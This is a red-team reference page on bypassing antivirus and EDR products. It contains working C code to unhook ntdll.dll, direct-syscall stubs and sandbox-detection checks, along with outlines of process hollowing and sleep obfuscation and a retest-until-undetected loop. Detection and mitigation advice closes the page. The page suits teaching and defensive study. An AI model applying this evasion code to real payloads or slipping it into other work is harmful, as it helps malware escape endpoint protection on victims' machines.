% Filename: 06-red-teaming/evasion/av-edr-bypass.md
% Display name: AV/EDR Bypass
% Last update: 2026-02-11
% ATT&CK Tactics: TA0005 (Defense Evasion)
% ATT&CK Techniques: T1027 (Obfuscated Files or Information), T1562.001 (Impair Defenses: Disable or Modify Tools)
% Authors: @TristanInSec

# AV/EDR Bypass

## Overview

Modern endpoint security combines traditional signature-based AV with behavioral EDR (Endpoint Detection and Response). AV scans files on disk for known signatures. EDR monitors process behavior, API calls, memory operations, and network activity at runtime. Bypassing these defenses requires understanding both static (file-based) and dynamic (behavior-based) detection mechanisms and using a combination of techniques to evade them.

## ATT&CK Mapping

- **Tactic:** TA0005 - Defense Evasion
- **Techniques:**
  - T1027 - Obfuscated Files or Information
  - T1562.001 - Impair Defenses: Disable or Modify Tools

## Techniques

### Understanding Detection Layers

```text
Layer 1: Static Analysis (AV)
  - File hash matching (known malware signatures)
  - YARA rules (byte pattern matching)
  - String analysis (known tool names, function names)
  - Import table analysis (suspicious API combinations)
  - Certificate/reputation checking

Layer 2: Dynamic Analysis (AV Sandbox)
  - Emulation of the binary in a sandbox
  - API call monitoring during emulation
  - Behavioral heuristics (what does it do in the first few seconds?)

Layer 3: Runtime Monitoring (EDR)
  - Userland API hooking (ntdll.dll, kernel32.dll)
  - ETW telemetry consumption
  - Kernel callbacks (process creation, thread creation, image loads)
  - Memory scanning (periodic scans of process memory)
  - Network monitoring (DNS, HTTP connections)
```

### Defeating Static Analysis

```text
Technique                          Effectiveness    Complexity
─────────────────────────────────  ───────────────  ──────────
Custom compilation (no templates)  High             Medium
Shellcode encryption (AES/XOR)     High             Low
String obfuscation                 Medium           Low
Dead code insertion                Medium           Low
API hashing (resolve at runtime)   High             Medium
Fresh payload (new hash each time) Medium           Low
Strip symbols and debug info       Low              Low
Pack with custom packer            Medium           Medium
```

### Userland Hook Bypass

EDR products hook key Windows API functions by inserting JMP instructions at the start of functions in ntdll.dll:

```text
Normal ntdll!NtAllocateVirtualMemory:
  mov r10, rcx
  mov eax, 0x18        ← syscall number
  syscall
  ret

Hooked ntdll!NtAllocateVirtualMemory:
  jmp EDR_Hook_Func    ← EDR redirects to its inspection code
  ...
  (original code)
  syscall
  ret

Bypass options:
  1. Direct syscalls — call the syscall instruction directly, skip ntdll
  2. Indirect syscalls — jump into ntdll after the hook (past the JMP)
  3. Unhook ntdll — restore original bytes from a clean copy of ntdll.dll
  4. Load a second copy of ntdll — map a fresh ntdll.dll from disk
```

### Direct Syscalls

```c
// Direct syscall — bypass ntdll.dll hooks entirely
// The syscall instruction is called directly from the payload

// Syscall stub for NtAllocateVirtualMemory (x64)
// Syscall number varies by Windows version

// Windows 10 21H2: NtAllocateVirtualMemory = 0x18
__asm {
    mov r10, rcx
    mov eax, 0x18
    syscall
    ret
}

// Tools that implement this:
//   SysWhispers — generates syscall stubs for all Nt* functions
//   https://github.com/jthuraisamy/SysWhispers
//
//   SysWhispers2 — improved version with random syscall sorting
//   https://github.com/jthuraisamy/SysWhispers2
//
//   SysWhispers3 — adds indirect syscalls, egg-hunter
//   https://github.com/klezVirus/SysWhispers3
```

### Unhooking ntdll.dll

```c
// Load a fresh copy of ntdll.dll from disk and overwrite the hooked .text section
// This removes all EDR hooks from ntdll in the current process

#include <windows.h>

void unhook_ntdll() {
    // 1. Map a fresh copy of ntdll.dll from disk
    HANDLE hFile = CreateFileA("C:\\Windows\\System32\\ntdll.dll",
        GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    HANDLE hMapping = CreateFileMapping(hFile, NULL, PAGE_READONLY, 0, 0, NULL);
    LPVOID freshNtdll = MapViewOfFile(hMapping, FILE_MAP_READ, 0, 0, 0);

    // 2. Get the current (hooked) ntdll base address
    HMODULE hookedNtdll = GetModuleHandleA("ntdll.dll");

    // 3. Find the .text section in both copies
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)hookedNtdll;
    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((BYTE*)hookedNtdll + dosHeader->e_lfanew);
    PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(ntHeaders);

    for (int i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++) {
        if (strcmp((char*)section[i].Name, ".text") == 0) {
            LPVOID hookedText = (LPVOID)((BYTE*)hookedNtdll + section[i].VirtualAddress);
            LPVOID freshText = (LPVOID)((BYTE*)freshNtdll + section[i].PointerToRawData);

            // 4. Overwrite hooked .text with clean .text
            DWORD oldProtect;
            VirtualProtect(hookedText, section[i].Misc.VirtualSize, PAGE_EXECUTE_READWRITE, &oldProtect);
            memcpy(hookedText, freshText, section[i].Misc.VirtualSize);
            VirtualProtect(hookedText, section[i].Misc.VirtualSize, oldProtect, &oldProtect);
            break;
        }
    }

    CloseHandle(hMapping);
    CloseHandle(hFile);
}
```

### Sleep Obfuscation

```text
EDR periodically scans process memory for known shellcode patterns.
Sleep obfuscation encrypts the payload in memory while sleeping,
decrypting only during execution.

Concept:
  1. Beacon sleeps for 60 seconds between callbacks
  2. Before sleeping: encrypt the beacon's memory region
  3. During sleep: memory contains only encrypted gibberish
  4. On wake: decrypt, execute callback, re-encrypt, sleep again

Implementations:
  - Ekko — ROP-based sleep encryption using timers
  - Foliage — APC-based sleep encryption
  - Cobalt Strike's built-in sleep masking (Malleable C2: sleep_mask)
```

### Sandbox Evasion

```c
// Techniques to detect AV sandboxes and delay/abort execution

#include <windows.h>

// Check 1: Low CPU count (sandboxes often have 1-2 CPUs)
SYSTEM_INFO si;
GetSystemInfo(&si);
if (si.dwNumberOfProcessors < 2) return;

// Check 2: Low RAM (sandboxes often have minimal RAM)
MEMORYSTATUSEX ms;
ms.dwLength = sizeof(ms);
GlobalMemoryStatusEx(&ms);
if (ms.ullTotalPhys < 2147483648ULL) return; // < 2GB

// Check 3: Recent user activity (sandboxes often have no cursor movement)
POINT p1, p2;
GetCursorPos(&p1);
Sleep(3000);
GetCursorPos(&p2);
if (p1.x == p2.x && p1.y == p2.y) return; // No mouse movement

// Check 4: Domain-joined (target environments are usually domain-joined)
// Sandboxes are typically standalone machines
DWORD bufSize = 256;
char domain[256];
GetComputerNameExA(ComputerNameDnsDomain, domain, &bufSize);
if (strlen(domain) == 0) return; // Not domain-joined
```

### Process Masquerading

```text
Run payloads under the context of trusted processes:

1. PPID Spoofing — make the payload appear as a child of a trusted process
   CreateProcess with PROC_THREAD_ATTRIBUTE_PARENT_PROCESS
   set to explorer.exe or svchost.exe PID

2. Process Hollowing — create a suspended trusted process, replace its code
   CreateProcess (SUSPENDED) → NtUnmapViewOfSection → WriteProcessMemory → ResumeThread

3. Process Doppelganging — use NTFS transactions to replace a process image
   NtCreateTransaction → file operations → NtCreateSection → process creation

4. Argument Spoofing — show benign command line in logs, execute real args
   CreateProcess with fake args → patch PEB.ProcessParameters in memory
```

## Testing Methodology

```text
1. Build payload in isolated environment
2. Test static detection:
   - Upload to antiscan.me (private, no distribution to AV vendors)
   - Do NOT use VirusTotal (shares samples with AV vendors)
3. Test dynamic detection:
   - Run in a VM matching target's OS and EDR version
   - Monitor EDR console for alerts
4. Test specific scenarios:
   - Does the payload survive a full system scan?
   - Does it trigger behavioral alerts during C2 callbacks?
   - Does process injection trigger EDR?
5. Iterate: modify and retest until clean
```

## Detection Methods

### Host-Based Detection

- Memory scanning for decrypted shellcode during execution
- Behavioral patterns: VirtualAlloc → memcpy → VirtualProtect → CreateThread
- Kernel callbacks detect process/thread creation regardless of userland hooks
- Driver-level monitoring (minifilters, kernel ETW)

### Network-Based Detection

- C2 traffic patterns (even with encrypted channels, metadata is visible)
- JA3/JA3S TLS fingerprinting
- DNS query anomalies

## Mitigation Strategies

- **EDR with kernel-level telemetry** — userland hook bypass does not defeat kernel callbacks
- **Hardware-backed security** — Credential Guard, HVCI, Secure Boot
- **Memory integrity enforcement** — detect modifications to system DLLs
- **Application control (WDAC)** — restrict which binaries can execute
- **Network segmentation** — limit C2 egress paths

## References

### MITRE ATT&CK

- [T1027 - Obfuscated Files or Information](https://attack.mitre.org/techniques/T1027/)
- [T1562.001 - Impair Defenses: Disable or Modify Tools](https://attack.mitre.org/techniques/T1562/001/)
